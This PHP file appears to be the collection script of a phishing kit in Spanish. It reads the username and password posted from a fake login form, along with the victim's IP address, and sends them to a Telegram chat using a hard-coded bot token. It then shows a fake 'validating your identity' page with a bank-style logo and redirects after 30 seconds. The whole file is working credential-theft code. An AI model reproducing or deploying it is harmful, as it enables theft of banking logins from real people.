<?php
function enviarMensajeTelegram($mensaje) {
    $botToken = '6766741718:AAERxvAz_mEhR3aROqFwcJDnomh6F0ZGHLM'; // Reemplaza con el token de tu bot
    $chatID = '-4079167315
'; // Reemplaza con el ID del canal o chat al que quieras enviar el mensaje

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array('chat_id' => $chatID, 'text' => $mensaje);

    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        )
    );

    $context  = stream_context_create($options);
    $resultado = file_get_contents($url, false, $context);

    return $resultado;
}

// Verifica si se ha enviado un formulario POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Recupera los datos del formulario
    $usuario = $_POST["userlogin"];
    $contrasena = $_POST["passwd"];

    // Registra la dirección IP del usuario
    $direccionIP = $_SERVER["REMOTE_ADDR"];

    // Construye un mensaje con la información
    $mensaje = "Usuario: " . $usuario . "\n";
    $mensaje .= "Contraseña: " . $contrasena . "\n";
    $mensaje .= "Dirección IP: " . $direccionIP . "\n";
    $mensaje .= "Mensaje Adicional: {Ganar es Ganar}";

    // Envía el mensaje a Telegram
    enviarMensajeTelegram($mensaje);

    // Aplica estilos CSS para centrar y estilizar el mensaje de espera
    echo '
    <style>
        .centered-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            height: 100vh;
        }
        .elegant-text {
            font-size: 24px; /* Ajusta el tamaño de la fuente según tus preferencias */
            font-family: "Arial", sans-serif; /* Cambia la fuente según tus preferencias */
        }
    </style>
    <div class="centered-container">
        <img src="bcm/images/logo.svg" alt="Logotipo" style="position: absolute; top: 10px; left: 10px;" />
        <img src="loading.gif" alt="Cargando..." />
        <p class="elegant-text">Estamos validando tu identidad por tu mayor seguridad.</p>
    </div>
    ';
    echo '<script>
        setTimeout(function() {
            window.location.href = "conexion.php";
        }, 30000); // 30 segundos
    </script>';
    exit; // Asegura que se detenga la ejecución del script
} else {
    // Si no se recibió un formulario POST, muestra un mensaje de error
    echo "No se recibieron datos del formulario.";
}
?>
